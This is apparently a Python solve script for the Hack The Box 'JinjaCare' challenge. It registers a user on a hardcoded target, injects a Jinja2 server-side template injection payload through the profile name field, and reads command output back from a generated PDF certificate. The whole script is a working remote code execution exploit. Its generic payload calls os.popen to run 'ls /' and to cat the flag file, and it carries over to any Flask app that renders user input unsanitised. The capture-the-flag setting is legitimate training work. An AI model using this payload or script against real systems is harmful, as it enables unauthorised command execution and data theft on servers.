#!/usr/bin/env python3
"""
HTB JinjaCare solve script.
SSTI (Flask render_template_string, unsanitized) via the "Full Name" profile field,
rendered server-side when generating the PDF vaccination certificate.
Confirmed against the official writeup (9f0ec5a3...pdf): payload
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('CMD').read() }}
"""
import requests, time, re, sys

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://154.57.164.80:44946"

s = requests.Session()
email = f"agent{int(time.time())}@mail.com"
password = "Passw0rd!123"

r = s.post(f"{BASE}/register", data={
    "name": "beluga", "email": email, "password": password, "confirmPassword": password,
})
print("[register]", r.status_code)

r = s.post(f"{BASE}/login", data={"email": email, "password": password})
print("[login]", r.status_code)


def set_name(payload):
    # the form requires all fields present or the update is silently ignored
    r = s.post(f"{BASE}/profile/personal", data={
        "name": payload,
        "email": email,
        "phone": "1234567890",
        "address": "test",
        "dateOfBirth": "2000-01-01",
        "gender": "Male",
        "emergencyName": "test",
        "emergencyPhone": "1234567890",
        "relationship": "friend",
    })
    return r


def get_certificate_text():
    r = s.get(f"{BASE}/generate_certificate")
    return r


# 1) sanity check: confirm SSTI executes
set_name("{{7*7}}")
r = get_certificate_text()
ctype = r.headers.get("Content-Type", "")
print("[cert content-type]", ctype, "len:", len(r.content))
with open("/tmp/cert_check.pdf", "wb") as f:
    f.write(r.content)

# try to extract text from the PDF to confirm rendering
import subprocess
out = subprocess.run(["pdftotext", "/tmp/cert_check.pdf", "-"], capture_output=True, text=True)
print("[cert text sanity]", out.stdout[:400])

if "49" in out.stdout:
    print("[+] SSTI confirmed (7*7=49 rendered)")
else:
    print("[!] SSTI not confirmed via {{7*7}}, aborting auto-exploit -- inspect manually")
    sys.exit(1)

# 2) enumerate root dir to find flag filename
cmd = "ls /"
payload = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('%s').read() }}" % cmd
set_name(payload)
r = get_certificate_text()
with open("/tmp/cert_ls.pdf", "wb") as f:
    f.write(r.content)
out = subprocess.run(["pdftotext", "/tmp/cert_ls.pdf", "-"], capture_output=True, text=True)
print("[ls /] cert text:\n", out.stdout)

# look for a flag-ish filename
m = re.search(r'(\S*flag\S*)', out.stdout, re.I)
flag_path = None
if m:
    flag_path = m.group(1)
    if not flag_path.startswith("/"):
        flag_path = "/" + flag_path
    print("[*] candidate flag file:", flag_path)
else:
    flag_path = "/flag.txt"
    print("[*] no flag filename found in ls, falling back to", flag_path)

# 3) read the flag file
cmd2 = f"cat {flag_path}"
payload2 = "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('%s').read() }}" % cmd2
set_name(payload2)
r = get_certificate_text()
with open("/tmp/cert_flag.pdf", "wb") as f:
    f.write(r.content)
out = subprocess.run(["pdftotext", "/tmp/cert_flag.pdf", "-"], capture_output=True, text=True)
print("[cat flag] cert text:\n", out.stdout)

m2 = re.search(r'HTB\{[^}\s]+\}', out.stdout)
if m2:
    print("\n[+] FLAG:", m2.group(0))
else:
    print("\n[!] flag pattern not found, inspect /tmp/cert_flag.pdf / output above manually")
